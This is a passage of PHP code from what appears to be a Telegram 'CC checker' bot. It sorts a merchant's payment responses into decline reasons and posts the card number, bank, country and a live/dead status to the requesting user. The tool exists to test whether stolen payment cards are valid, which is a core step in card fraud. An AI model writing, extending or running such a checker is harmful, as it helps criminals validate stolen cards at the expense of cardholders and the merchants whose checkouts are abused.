$status = ("Declined ❌");  
$respo = ("Processor Declined");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Merchant account does not support 3D Secure transactions for card type.")) {
$status = ("Declined ❌");  
$respo = ("Merchant account does not support 3D Secure transactions for card type");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Limit Exceeded")) {
$status = ("Declined ❌");  
$respo = ("Limit Exceeded");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Authentication Required")) {
$status = ("Declined ❌");  
$respo = ("Authentication Required");
}

elseif(strpos($result5, "Your payment could not be taken. Please try again or use a different payment method. Cannot Authorize at this time (Policy)")) {
$status = ("Declined ❌");  
$respo = ("Cannot Authorize at this time (Policy)");
}


else {
$status = ("Declined ❌");  
$respo = ("$msg");
}


$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);
//=============CHECKER END=============//
bot('editMessageText',[
                'chat_id'=>$chat_id,
               'message_id'=>$messageidtoruby,
'text'=>"<b>
Ruby [Mage 20$] 🌩
━━━━━━━━━━━━━
[ϟ]Card: <code>$lista</code> 
[ϟ]Status: $status
[ϟ]Result: $respo

[ϟ]Brand: <code>$level-$brand</code>
[ϟ]Type: <code>$type</code>
[ϟ]Bank: <code>$bank</code>
[ϟ]Country: <code>$country_name [$country_flag]</code>

[ϟ]T: <code>$time SEC</code> | P: <code>Live ✅</code>
━━━━━━━━━━━━━
[ϟ]Req: <b>@$username</b> [$rank]
[ϟ]Dev: <code>@celestial_being</code>

</b>",
      'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);
recordBotResponseTimestamp($userId);
}else{
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoruby,
            'text'=>"<b>Provide a Valid CC</b>",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true'
            
        ]);

}






                
            